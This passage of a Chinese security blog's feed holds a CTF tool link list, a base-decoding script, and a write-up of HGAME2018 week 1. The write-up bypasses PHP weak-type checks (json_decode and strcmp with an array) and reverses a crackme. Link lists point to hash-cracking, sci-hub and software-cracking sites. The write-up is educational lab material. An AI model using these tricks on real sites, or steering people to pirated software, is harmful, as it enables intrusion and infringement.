rel="noopener">http://readfree.me/</a></p><p><a href="http://www.kindle178.com/" target="_blank" rel="noopener">http://www.kindle178.com/</a></p><p><a href="http://mebook.cc/?s=%E7%A8%8B%E5%BA%8F" target="_blank" rel="noopener">http://mebook.cc/?s=%E7%A8%8B%E5%BA%8F</a></p><p><a href="http://cn.epubee.com/books/" target="_blank" rel="noopener">http://cn.epubee.com/books/</a></p><p><a href="http://www.books-share.com/" target="_blank" rel="noopener">http://www.books-share.com/</a></p><p><a href="http://en.booksee.org" target="_blank" rel="noopener">http://en.booksee.org</a></p><p><a href="http://booksc.org" target="_blank" rel="noopener">http://booksc.org</a></p><p><a href="https://sci-hub.tw/" target="_blank" rel="noopener">https://sci-hub.tw/</a></p><p><a href="http://bestcbooks.com/" target="_blank" rel="noopener">http://bestcbooks.com/</a></p><h1 id="软件破解"><a href="#软件破解" class="headerlink" title="软件破解"></a>软件破解</h1><p><a href="http://astalavista.box.sk/" target="_blank" rel="noopener">http://astalavista.box.sk/</a></p>]]></content>
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
            <tag> software_development </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CTF轻工具个人集合</title>
      <link href="/CTF%E8%BD%BB%E5%B7%A5%E5%85%B7%E4%B8%AA%E4%BA%BA%E9%9B%86%E5%90%88/"/>
      <url>/CTF%E8%BD%BB%E5%B7%A5%E5%85%B7%E4%B8%AA%E4%BA%BA%E9%9B%86%E5%90%88/</url>
      <content type="html"><![CDATA[<p>持续更新ing</p><p>可能以后还会重新整理</p><a id="more"></a><h1 id="古典密码学工具"><a href="#古典密码学工具" class="headerlink" title="古典密码学工具"></a>古典密码学工具</h1><h2 id="在线解密"><a href="#在线解密" class="headerlink" title="在线解密"></a>在线解密</h2><p><a href="http://www.practicalcryptography.com/ciphers/" target="_blank" rel="noopener">http://www.practicalcryptography.com/ciphers/</a></p><p>直链列表：</p><ul><li><a href="http://www.practicalcryptography.com/ciphers/classical-era/atbash-cipher/" target="_blank" rel="noopener">Atbash Cipher</a></li><li><a href="http://www.practicalcryptography.com/ciphers/classical-era/rot13/" target="_blank" rel="noopener">ROT13 Cipher</a></li><li><a href="http://www.practicalcryptography.com/ciphers/classical-era/caesar/" target="_blank" rel="noopener">Caesar Cipher</a></li><li><a href="http://www.practicalcryptography.com/ciphers/classical-era/affine/" target="_blank" rel="noopener">Affine Cipher</a></li><li><a href="http://www.practicalcryptography.com/ciphers/classical-era/rail-fence/" target="_blank" rel="noopener">Rail-fence Cipher</a></li><li><a href="http://www.practicalcryptography.com/ciphers/classical-era/baconian/" target="_blank" rel="noopener">Baconian Cipher</a></li><li><a href="http://www.practicalcryptography.com/ciphers/classical-era/polybius-square/" target="_blank" rel="noopener">Polybius Square Cipher</a></li><li><a href="http://www.practicalcryptography.com/ciphers/classical-era/simple-substitution/" target="_blank" rel="noopener">Simple Substitution Cipher</a></li><li><a href="http://www.practicalcryptography.com/ciphers/classical-era/codes-and-nomenclators/" target="_blank" rel="noopener">Codes and Nomenclators Cipher</a></li><li><a href="http://www.practicalcryptography.com/ciphers/classical-era/columnar-transposition/" target="_blank" rel="noopener">Columnar Transposition Cipher</a></li><li><a href="http://www.practicalcryptography.com/ciphers/classical-era/autokey/" target="_blank" rel="noopener">Autokey Cipher</a></li><li><a href="http://www.practicalcryptography.com/ciphers/classical-era/beaufort/" target="_blank" rel="noopener">Beaufort Cipher</a></li><li><a href="http://www.practicalcryptography.com/ciphers/classical-era/porta/" target="_blank" rel="noopener">Porta Cipher</a></li><li><a href="http://www.practicalcryptography.com/ciphers/classical-era/running-key/" target="_blank" rel="noopener">Running Key Cipher</a></li><li><a href="http://www.practicalcryptography.com/ciphers/classical-era/vigenere-gronsfeld-and-autokey/" target="_blank" rel="noopener">Vigenère and Gronsfeld Cipher</a></li><li><a href="http://www.practicalcryptography.com/ciphers/classical-era/homophonic-substitution/" target="_blank" rel="noopener">Homophonic Substitution Cipher</a></li><li><a href="http://www.practicalcryptography.com/ciphers/classical-era/four-square/" target="_blank" rel="noopener">Four-Square Cipher</a></li><li><a href="http://www.practicalcryptography.com/ciphers/classical-era/hill/" target="_blank" rel="noopener">Hill Cipher</a></li><li><a href="http://www.practicalcryptography.com/ciphers/classical-era/playfair/" target="_blank" rel="noopener">Playfair Cipher</a></li><li><a href="http://www.practicalcryptography.com/ciphers/classical-era/adfgvx/" target="_blank" rel="noopener">ADFGVX Cipher</a></li><li><a href="http://www.practicalcryptography.com/ciphers/classical-era/adfgx/" target="_blank" rel="noopener">ADFGX Cipher</a></li><li><a href="http://www.practicalcryptography.com/ciphers/classical-era/bifid/" target="_blank" rel="noopener">Bifid Cipher</a></li><li><a href="http://www.practicalcryptography.com/ciphers/classical-era/straddle-checkerboard/" target="_blank" rel="noopener">Straddle Checkerboard Cipher</a></li><li><a href="http://www.practicalcryptography.com/ciphers/classical-era/trifid/" target="_blank" rel="noopener">Trifid Cipher</a></li><li><a href="http://www.practicalcryptography.com/ciphers/classical-era/fractionated-morse/" target="_blank" rel="noopener">Fractionated Morse Cipher</a></li><li><a href="http://www.practicalcryptography.com/ciphers/mechanical-era/enigma/" target="_blank" rel="noopener">Enigma Cipher</a></li><li><a href="http://www.practicalcryptography.com/ciphers/mechanical-era/lorenz/" target="_blank" rel="noopener">Lorenz Cipher</a></li></ul><p>另一个网站： <a href="http://tool.yovisun.com/wordcounter/" target="_blank" rel="noopener">WordCounter 英文论文单词统计</a></p><p>另一个维吉尼亚：<a href="https://atomcated.github.io/Vigenere/" target="_blank" rel="noopener">https://atomcated.github.io/Vigenere/</a></p><p>另一个维吉尼亚：<a href="http://www.mygeocachingprofile.com/codebreaker.vigenerecipher.aspx" target="_blank" rel="noopener">http://www.mygeocachingprofile.com/codebreaker.vigenerecipher.aspx</a></p><p>另一个维吉尼亚：<a href="https://f00l.de/hacking/vigenere.php" target="_blank" rel="noopener">https://f00l.de/hacking/vigenere.php</a></p><p>文字加密解密： <a href="http://www.qqxiuzi.cn/bianma/wenbenjiami.php" target="_blank" rel="noopener">http://www.qqxiuzi.cn/bianma/wenbenjiami.php</a></p><p>单表替换：<a href="https://quipqiup.com/" target="_blank" rel="noopener">https://quipqiup.com/</a></p><h2 id="库"><a href="#库" class="headerlink" title="库"></a>库</h2><p><a href="http://pycipher.readthedocs.io/en/master/#" target="_blank" rel="noopener">pycipher</a></p><h1 id="数论计算器"><a href="#数论计算器" class="headerlink" title="数论计算器"></a>数论计算器</h1><p><a href="https://www.alpertron.com.ar/CALTORS.HTM" target="_blank" rel="noopener">https://www.alpertron.com.ar/CALTORS.HTM</a></p><h1 id="Brainfuck"><a href="#Brainfuck" class="headerlink" title="Brainfuck"></a>Brainfuck</h1><p><a href="http://esoteric.sange.fi/brainfuck/impl/interp/i.html" target="_blank" rel="noopener">http://esoteric.sange.fi/brainfuck/impl/interp/i.html</a></p><h1 id="PWN-cheatsheet"><a href="#PWN-cheatsheet" class="headerlink" title="PWN-cheatsheet"></a>PWN-cheatsheet</h1><p><a href="https://github.com/Naetw/CTF-pwn-tips" target="_blank" rel="noopener">https://github.com/Naetw/CTF-pwn-tips</a></p><h1 id="PHP代码在线执行"><a href="#PHP代码在线执行" class="headerlink" title="PHP代码在线执行"></a>PHP代码在线执行</h1><p><a href="http://sandbox.onlinephpfunctions.com/" target="_blank" rel="noopener">http://sandbox.onlinephpfunctions.com/</a></p><h1 id="在线扫码"><a href="#在线扫码" class="headerlink" title="在线扫码"></a>在线扫码</h1><p><a href="https://online-barcode-reader.inliteresearch.com/" target="_blank" rel="noopener">https://online-barcode-reader.inliteresearch.com/</a></p><h1 id="MD5破解"><a href="#MD5破解" class="headerlink" title="MD5破解"></a>MD5破解</h1><p><a href="https://somd5.com/" target="_blank" rel="noopener">https://somd5.com/</a></p><p><a href="http://www.md5online.org/" target="_blank" rel="noopener">http://www.md5online.org/</a></p><h1 id="HASH破解"><a href="#HASH破解" class="headerlink" title="HASH破解"></a>HASH破解</h1><p><a href="https://www.onlinehashcrack.com/" target="_blank" rel="noopener">https://www.onlinehashcrack.com/</a></p><p><a href="https://crackstation.net/" target="_blank" rel="noopener">https://crackstation.net/</a></p><h1 id="在线OCR"><a href="#在线OCR" class="headerlink" title="在线OCR"></a>在线OCR</h1><p><a href="http://jinapdf.com/cn/image-to-text-file.php" target="_blank" rel="noopener">http://jinapdf.com/cn/image-to-text-file.php</a></p><p><a href="http://ocr.wdku.net/" target="_blank" rel="noopener">http://ocr.wdku.net/</a></p><h1 id="base家族自动解"><a href="#base家族自动解" class="headerlink" title="base家族自动解"></a>base家族自动解</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># Python3</span></span><br><span class="line"><span class="comment"># AutoBase.py</span></span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line">s = input()</span><br><span class="line">lis1 = [s]</span><br><span class="line">lis2 = []</span><br><span class="line">lis3 = []</span><br><span class="line">lis4 = []</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> lis1:</span><br><span class="line">ok = <span class="number">0</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">lis2.append(b64decode(a).decode(<span class="string">'ascii'</span>))</span><br><span class="line">ok = <span class="number">1</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">lis2.append(b32decode(a).decode(<span class="string">'ascii'</span>))</span><br><span class="line">ok = <span class="number">1</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">lis2.append(b16decode(a).decode(<span class="string">'ascii'</span>))</span><br><span class="line">ok = <span class="number">1</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> ok:</span><br><span class="line">lis3.append(a)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> len(lis2):</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">lis1=lis2.copy()</span><br><span class="line">lis2.clear()</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> range(<span class="number">0</span>,len(lis3)):</span><br><span class="line">ok = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> lis3[a]:</span><br><span class="line"><span class="keyword">if</span> ord(b)&gt;<span class="number">126</span> <span class="keyword">or</span> ord(b)&lt;<span class="number">32</span>:</span><br><span class="line">ok = <span class="number">0</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> ok:</span><br><span class="line">lis4.append(lis3[a])</span><br><span class="line">print(lis4)</span><br></pre></td></tr></table></figure><h1 id="漏洞平台"><a href="#漏洞平台" class="headerlink" title="漏洞平台"></a>漏洞平台</h1><p><a href="http://www.cnnvd.org.cn/" target="_blank" rel="noopener">http://www.cnnvd.org.cn/</a></p><p><a href="http://www.cnvd.org.cn/" target="_blank" rel="noopener">http://www.cnvd.org.cn/</a></p><p><a href="http://exploit-db.com" target="_blank" rel="noopener">http://exploit-db.com</a></p><p><a href="http://www.exploit-id.com/" target="_blank" rel="noopener">http://www.exploit-id.com/</a></p><p><a href="http://cve.mitre.org/" target="_blank" rel="noopener">http://cve.mitre.org/</a></p><p><a href="http://www.securiteam.com/" target="_blank" rel="noopener">http://www.securiteam.com/</a></p><p><a href="http://securityvulns.com/" target="_blank" rel="noopener">http://securityvulns.com/</a> (更新至2015.02.11)</p><p><a href="http://securityvulns.ru/" target="_blank" rel="noopener">http://securityvulns.ru/</a></p><p><a href="http://www.securityfocus.com/" target="_blank" rel="noopener">http://www.securityfocus.com/</a></p><p><a href="http://marc.info/?l=bugtraq" target="_blank" rel="noopener">http://marc.info/?l=bugtraq</a></p><p><a href="http://www.securitytracker.com/" target="_blank" rel="noopener">http://www.securitytracker.com/</a></p><p><a href="https://packetstormsecurity.com/" target="_blank" rel="noopener">https://packetstormsecurity.com/</a></p><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p><a href="https://ctftime.org/" target="_blank" rel="noopener">https://ctftime.org/</a></p><p><a href="http://shell-storm.org/repo/" target="_blank" rel="noopener">http://shell-storm.org/repo/</a></p><p><a href="https://www.jarvisoj.com/" target="_blank" rel="noopener">https://www.jarvisoj.com/</a></p><p><a href="http://oj.xctf.org.cn/web/login/?next=/" target="_blank" rel="noopener">http://oj.xctf.org.cn/web/login/?next=/</a></p><p><a href="http://www.shiyanbar.com/ctf/practice" target="_blank" rel="noopener">http://www.shiyanbar.com/ctf/practice</a></p><p><a href="http://ctf.nuptsast.com/" target="_blank" rel="noopener">http://ctf.nuptsast.com/</a></p><p><a href="https://cgctf.nuptsast.com" target="_blank" rel="noopener">https://cgctf.nuptsast.com</a></p><p><a href="https://skidophrenia.ctfd.io/" target="_blank" rel="noopener">https://skidophrenia.ctfd.io/</a></p><p><a href="https://www.ichunqiu.com/battalion" target="_blank" rel="noopener">https://www.ichunqiu.com/battalion</a></p><p><a href="http://cxsecurity.com/exploit/" target="_blank" rel="noopener">http://cxsecurity.com/exploit/</a></p><p><a href="http://reversing.kr/" target="_blank" rel="noopener">http://reversing.kr/</a></p><p><a href="http://pwnable.kr/" target="_blank" rel="noopener">http://pwnable.kr/</a></p><p><a href="http://codeengn.com/challenges/" target="_blank" rel="noopener">http://codeengn.com/challenges/</a></p><p><a href="https://exploit-exercises.com/" target="_blank" rel="noopener">https://exploit-exercises.com/</a></p><p><a href="https://io.netgarage.org/" target="_blank" rel="noopener">https://io.netgarage.org/</a></p><p><a href="http://hackinglab.cn/" target="_blank" rel="noopener">http://hackinglab.cn/</a></p><p><a href="http://captf.com/" target="_blank" rel="noopener">http://captf.com/</a></p><p><a href="http://www.baimaoxueyuan.com/ctf" target="_blank" rel="noopener">http://www.baimaoxueyuan.com/ctf</a></p><p><a href="http://hkyx.myhack58.com/index.html" target="_blank" rel="noopener">http://hkyx.myhack58.com/index.html</a></p><p><a href="http://overthewire.org/wargames/krypton/" target="_blank" rel="noopener">http://overthewire.org/wargames/krypton/</a></p><p><a href="https://backdoor.sdslabs.co/" target="_blank" rel="noopener">https://backdoor.sdslabs.co/</a></p><p><a href="http://www.hetianlab.com/CTFrace.html" target="_blank" rel="noopener">http://www.hetianlab.com/CTFrace.html</a></p><p><a href="http://security.cs.rpi.edu/courses/binexp-spring2015/" target="_blank" rel="noopener">http://security.cs.rpi.edu/courses/binexp-spring2015/</a> </p><p><a href="http://www.wechall.net/challs" target="_blank" rel="noopener">http://www.wechall.net/challs</a></p><p><a href="http://smashthestack.org/wargames.html" target="_blank" rel="noopener">http://smashthestack.org/wargames.html</a></p><p><a href="https://microcorruption.com/login" target="_blank" rel="noopener">https://microcorruption.com/login</a></p><p><a href="https://www.hackthissite.org/pages/index/index.php" target="_blank" rel="noopener">https://www.hackthissite.org/pages/index/index.php</a></p><p><a href="https://exploit-exercises.com/protostar/" target="_blank" rel="noopener">https://exploit-exercises.com/protostar/</a></p><p><a href="http://ctf.bugku.com/challenges" target="_blank" rel="noopener">http://ctf.bugku.com/challenges</a></p><p><a href="https://id0-rsa.pub/" target="_blank" rel="noopener">https://id0-rsa.pub/</a></p>]]></content>
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Crypto </tag>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>HGAME2018-week1WP</title>
      <link href="/HGAME2018-week1WP/"/>
      <url>/HGAME2018-week1WP/</url>
      <content type="html"><![CDATA[<p>第一周难度还是挺温柔，居然让我AK了，好开心呀</p><p>对了，这篇是先在本地生成的，周日才传上博客的。</p><a id="more"></a><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Are-you-from-Europe"><a href="#Are-you-from-Europe" class="headerlink" title="Are you from Europe?"></a>Are you from Europe?</h2><p>第一次做这种题，还学到了一点浏览器console的用法……<br>直接看源码，最开始发现在F12的console里输入quartz +=100000000有用<br>然后很开心地抽卡，抽了半天感觉不对，仔细看了下概率……淦哦我是不是傻</p><p>翻到最底下有个函数，看着就是和flag有关的样子<br><img src="/HGAME2018-week1WP/snipaste20180205_010720.png" title="Are_you_from_Europe?1"><br>代码美化一哈<br><img src="/HGAME2018-week1WP/snipaste20180205_010751.png" title="Are_you_from_Europe?2"></p><h2 id="special-number"><a href="#special-number" class="headerlink" title="special number"></a>special number</h2><p>源码已经放了出来<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include_once</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'key'</span>]))&#123;</span><br><span class="line">    $pattern = <span class="string">'/^(?=.*[0-9].*)(?=.*[a-zA-Z].*).&#123;7,&#125;$/ '</span>;</span><br><span class="line">    $key = $_GET[<span class="string">'key'</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match($pattern,$key)===<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"格式错误"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $lock=<span class="string">"******************"</span>;</span><br><span class="line">        $b = json_decode($key);</span><br><span class="line">        <span class="keyword">if</span>($b==$lock)</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"this is no special number"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这个题的考点就是PHP弱类型中0==string这个情况（PHP混乱邪恶无疑<br>就是要让json_decode出来的结果是0，于是在沙盒<a href="http://sandbox.onlinephpfunctions[.]com/里实验出了结果" target="_blank" rel="noopener">http://sandbox.onlinephpfunctions[.]com/里实验出了结果</a><br><img src="/HGAME2018-week1WP/snipaste20180205_215726.png" title="special_number1"><br>然后去原网页的时候还失败了一次……<br><img src="/HGAME2018-week1WP/snipaste20180205_215734.png" title="special_number2"><br>因为传入的时候会再加对引号……<br><img src="/HGAME2018-week1WP/snipaste20180205_215746.png" title="special_number3"><br>这里必须感谢一下飘零大大指点的，一开始光想着怎么绕过正则，反而偏离了正轨<br>顺便正则的效果大概是需要传入的字符串既有数字又有字母长度大于6就行</p><h2 id="can-u-find-me"><a href="#can-u-find-me" class="headerlink" title="can u find me?"></a>can u find me?</h2><blockquote><p>Description<br>only robot know where is the flag</p></blockquote><p>那当然是robots.txt啦，这不是送？<br><img src="/HGAME2018-week1WP/snipaste20180204_201235.png" title="can_u_find_me?1"><br>直接访问看到<br><img src="/HGAME2018-week1WP/snipaste20180208_104340.png" title="can_u_find_me?2"><br>抓包看看，发现Cookie里有个user=<br>补上，发出，得flag<br><img src="/HGAME2018-week1WP/snipaste20180204_201018.png" title="can_u_find_me?3"></p><h2 id="tell-me-what-you-want"><a href="#tell-me-what-you-want" class="headerlink" title="tell me what you want"></a>tell me what you want</h2><p>这个题就是纯练改HTTP头的<br>点进去问你想要啥，你输flag告诉你用POST更好，然后之后每改一次都会告诉你新的要改的地方，全改完得到flag<br><img src="/HGAME2018-week1WP/snipaste20180204_202350.png" title="tell_me_what_you_want"></p><h2 id="我们不一样"><a href="#我们不一样" class="headerlink" title="我们不一样"></a>我们不一样</h2><p>还是源码放出，还是弱类型<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include_once</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'str1'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'str2'</span>])) &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_POST[<span class="string">'str1'</span>] != $_POST[<span class="string">'str2'</span>] &amp;&amp; strcmp($_POST[<span class="string">'str1'</span>], $_POST[<span class="string">'str2'</span>]) == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flag is:"</span>.$flag;</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Something wrong.."</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这里的弱类型在于string和非string的strcmp返回0，而array!=string成立<br><img src="/HGAME2018-week1WP/snipaste20180204_231047.png" title="我们不一样"></p><h1 id="Rev"><a href="#Rev" class="headerlink" title="Rev"></a>Rev</h1><h2 id="re0"><a href="#re0" class="headerlink" title="re0"></a>re0</h2><p>拖进IDA，F5出flag<br><img src="/HGAME2018-week1WP/snipaste20180204_230513.png" title="re0"></p><h2 id="baby-crack"><a href="#baby-crack" class="headerlink" title="baby_crack"></a>baby_crack</h2><p>拖进IDA，F5，读代码。发现对操作做了这样的操作：</p><ul><li>按位置进行循环移位</li><li>将输入的每个通过一个映射转到另一个<img src="/HGAME2018-week1WP/snipaste20180205_110549.png" title="baby_crack2"></li><li>进行几轮交换<img src="/HGAME2018-week1WP/snipaste20180205_110559.png" title="baby_crack3"></li><li>与flag进行同意操作得到的结果进行比较<br>于是写出反着来的操作<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//baby1.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> indx[]=&#123;<span class="number">17</span>,<span class="number">191</span>,<span class="number">186</span>,<span class="number">15</span>,<span class="number">213</span>,<span class="number">204</span>,<span class="number">188</span>,<span class="number">30</span>,<span class="number">25</span>,<span class="number">1</span>,<span class="number">135</span>,<span class="number">27</span>,<span class="number">150</span>,<span class="number">195</span>,<span class="number">134</span>,<span class="number">26</span>,<span class="number">126</span>,<span class="number">107</span>,<span class="number">90</span>,<span class="number">141</span>,<span class="number">251</span>,<span class="number">194</span>,<span class="number">139</span>,<span class="number">179</span>,<span class="number">177</span>,<span class="number">221</span>,<span class="number">239</span>,<span class="number">10</span>,<span class="number">75</span>,<span class="number">248</span>,<span class="number">85</span>,<span class="number">38</span>,<span class="number">118</span>,<span class="number">171</span>,<span class="number">193</span>,<span class="number">100</span>,<span class="number">23</span>,<span class="number">201</span>,<span class="number">175</span>,<span class="number">97</span>,<span class="number">103</span>,<span class="number">74</span>,<span class="number">202</span>,<span class="number">18</span>,<span class="number">36</span>,<span class="number">225</span>,<span class="number">174</span>,<span class="number">80</span>,<span class="number">58</span>,<span class="number">112</span>,<span class="number">55</span>,<span class="number">237</span>,<span class="number">224</span>,<span class="number">119</span>,<span class="number">183</span>,<span class="number">46</span>,<span class="number">161</span>,<span class="number">45</span>,<span class="number">50</span>,<span class="number">123</span>,<span class="number">137</span>,<span class="number">207</span>,<span class="number">240</span>,<span class="number">148</span>,<span class="number">33</span>,<span class="number">101</span>,<span class="number">11</span>,<span class="number">63</span>,<span class="number">125</span>,<span class="number">41</span>,<span class="number">59</span>,<span class="number">5</span>,<span class="number">81</span>,<span class="number">231</span>,<span class="number">129</span>,<span class="number">110</span>,<span class="number">51</span>,<span class="number">198</span>,<span class="number">215</span>,<span class="number">172</span>,<span class="number">60</span>,<span class="number">154</span>,<span class="number">34</span>,<span class="number">220</span>,<span class="number">122</span>,<span class="number">8</span>,<span class="number">106</span>,<span class="number">151</span>,<span class="number">241</span>,<span class="number">95</span>,<span class="number">142</span>,<span class="number">98</span>,<span class="number">111</span>,<span class="number">19</span>,<span class="number">138</span>,<span class="number">130</span>,<span class="number">140</span>,<span class="number">42</span>,<span class="number">73</span>,<span class="number">57</span>,<span class="number">24</span>,<span class="number">104</span>,<span class="number">208</span>,<span class="number">131</span>,<span class="number">180</span>,<span class="number">66</span>,<span class="number">54</span>,<span class="number">113</span>,<span class="number">12</span>,<span class="number">87</span>,<span class="number">16</span>,<span class="number">243</span>,<span class="number">40</span>,<span class="number">212</span>,<span class="number">52</span>,<span class="number">14</span>,<span class="number">228</span>,<span class="number">255</span>,<span class="number">6</span>,<span class="number">173</span>,<span class="number">92</span>,<span class="number">252</span>,<span class="number">219</span>,<span class="number">222</span>,<span class="number">218</span>,<span class="number">159</span>,<span class="number">234</span>,<span class="number">53</span>,<span class="number">94</span>,<span class="number">120</span>,<span class="number">82</span>,<span class="number">217</span>,<span class="number">79</span>,<span class="number">109</span>,<span class="number">187</span>,<span class="number">168</span>,<span class="number">176</span>,<span class="number">21</span>,<span class="number">67</span>,<span class="number">144</span>,<span class="number">37</span>,<span class="number">166</span>,<span class="number">84</span>,<span class="number">254</span>,<span class="number">13</span>,<span class="number">235</span>,<span class="number">169</span>,<span class="number">253</span>,<span class="number">233</span>,<span class="number">93</span>,<span class="number">22</span>,<span class="number">203</span>,<span class="number">47</span>,<span class="number">78</span>,<span class="number">189</span>,<span class="number">197</span>,<span class="number">9</span>,<span class="number">70</span>,<span class="number">247</span>,<span class="number">192</span>,<span class="number">31</span>,<span class="number">89</span>,<span class="number">211</span>,<span class="number">2</span>,<span class="number">35</span>,<span class="number">157</span>,<span class="number">96</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">246</span>,<span class="number">164</span>,<span class="number">29</span>,<span class="number">49</span>,<span class="number">76</span>,<span class="number">200</span>,<span class="number">155</span>,<span class="number">199</span>,<span class="number">223</span>,<span class="number">102</span>,<span class="number">44</span>,<span class="number">236</span>,<span class="number">121</span>,<span class="number">115</span>,<span class="number">48</span>,<span class="number">105</span>,<span class="number">99</span>,<span class="number">149</span>,<span class="number">214</span>,<span class="number">190</span>,<span class="number">68</span>,<span class="number">232</span>,<span class="number">165</span>,<span class="number">242</span>,<span class="number">153</span>,<span class="number">216</span>,<span class="number">56</span>,<span class="number">160</span>,<span class="number">227</span>,<span class="number">143</span>,<span class="number">210</span>,<span class="number">83</span>,<span class="number">61</span>,<span class="number">86</span>,<span class="number">146</span>,<span class="number">114</span>,<span class="number">250</span>,<span class="number">184</span>,<span class="number">167</span>,<span class="number">205</span>,<span class="number">238</span>,<span class="number">147</span>,<span class="number">133</span>,<span class="number">108</span>,<span class="number">127</span>,<span class="number">170</span>,<span class="number">178</span>,<span class="number">71</span>,<span class="number">206</span>,<span class="number">128</span>,<span class="number">32</span>,<span class="number">28</span>,<span class="number">124</span>,<span class="number">7</span>,<span class="number">226</span>,<span class="number">185</span>,<span class="number">145</span>,<span class="number">69</span>,<span class="number">116</span>,<span class="number">152</span>,<span class="number">245</span>,<span class="number">62</span>,<span class="number">3</span>,<span class="number">196</span>,<span class="number">65</span>,<span class="number">1</span>,<span class="number">43</span>,<span class="number">72</span>,<span class="number">39</span>,<span class="number">230</span>,<span class="number">91</span>,<span class="number">244</span>,<span class="number">156</span>,<span class="number">136</span>,<span class="number">117</span>,<span class="number">162</span>,<span class="number">182</span>,<span class="number">20</span>,<span class="number">209</span>,<span class="number">229</span>,<span class="number">77</span>,<span class="number">64</span>,<span class="number">249</span>,<span class="number">158</span>,<span class="number">88</span>,<span class="number">163</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> arr[]=&#123;<span class="number">166</span>,<span class="number">78</span>,<span class="number">5</span>,<span class="number">162</span>,<span class="number">182</span>,<span class="number">8</span>,<span 